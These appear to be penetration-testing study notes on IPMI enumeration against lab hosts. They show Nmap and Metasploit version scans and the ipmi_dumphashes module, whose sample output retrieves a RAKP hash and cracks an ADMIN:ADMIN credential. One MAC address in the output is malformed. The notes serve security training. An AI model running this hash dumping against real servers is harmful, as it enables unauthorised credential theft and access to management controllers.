---
id: Enumeration
aliases: []
tags:
  - Networking/Services/IPMI/Enumeration
---

# Enumeration

<!-- Nmap {{{-->
## Nmap

Footprint the service with the `ipmi-version`
[[Nmap Scripting Engine|NSE]] script

```sh
sudo nmap -sU --script ipmi-version -p 623 <target_domain>
```

<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
> ```
> ```sh
> Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
> Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
> Host is up (0.00064s latency).
>
> PORT    STATE SERVICE
> 623/udp open  asf-rmcp
> | ipmi-version:
> |   Version:
> |     IPMI-2.0
> |   UserAuth:
> |   PassAuth: auth_user, non_null_user
> |_  Level: 2.0
> MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
>
> Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
> ```
>
> - [[General|IPMI]] version 2.0 is listening on port `623`/UDP
>
<!-- }}} -->

<!-- Metasploit {{{-->
## Metasploit

### Version Scan

[IPMI Information Discovery](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/)
can be used to discover host information through IPMI Cheannel Auth probes

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_version
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Select Exploit|Select scanner]]
>
> ```sh
> msf6 > use auxiliary/scanner/ipmi/ipmi_version
> ```
>
> 2. [[Metasploit#Set Options|Select options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
> ```
>
> 3. [[Metasploit#Show Options|Show options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
> ```
>
> ```sh
> Module options (auxiliary/scanner/ipmi/ipmi_version):
>
>    Name       Current Setting  Required  Description
>    ----       ---------------  --------  -----------
>    BATCHSIZE  256              yes       The number of hosts to probe in each set
>    RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>    RPORT      623              yes       The target port (UDP)
>    THREADS    10               yes       The number of concurrent threads
> ```
>
> 4. [[Metasploit#Run Exploit|Run the scan]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > run
> ```
>
> ```sh
> [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
> [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Dumping Hashes {{{-->
## Dumping Hashes

Retrieve [[General|IPMI]] hashes with the Metasploit
[IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
module

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Select Exploit|Select scanner]]
>
> ```sh
> msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
> ```
>
> 2. [[Metasploit#Set Options|Select options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
> ```
>
> 3. [[Metasploit#Show Options|Show options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
> ```
>
> ```sh
> Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
> 
>    Name                 Current Setting                                                    Required  Description
>    ----                 ---------------                                                    --------  -----------
>    CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
>    OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
>    OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
>    PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
>    RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>    RPORT                623                                                                yes       The target port
>    THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
>    USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
> ```
>
> 4. [[Metasploit#Run Exploit|Run the scan]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
> ```
> ```sh
> [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
> [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
>
> This flaw is a critical component of the [[General|IPMI]] specification
> ```
<!-- }}} -->

<!-- }}} -->
